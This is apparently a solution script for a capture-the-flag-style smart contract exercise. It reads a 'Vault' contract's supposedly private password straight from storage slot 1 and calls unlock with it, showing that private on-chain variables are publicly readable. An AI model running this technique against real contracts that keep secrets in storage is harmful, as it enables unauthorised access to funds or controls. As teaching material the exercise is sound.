import { ethers } from 'hardhat';

const CONTRACT_ADDRESS = '0x9625f022c1e92957bbaa5c141b341d07e0fcf5bb';
const CONTRACT_NAME = 'Vault';

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const password = await ethers.provider.getStorageAt(contract.address, 1);

  const tx = await contract.unlock(password);
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
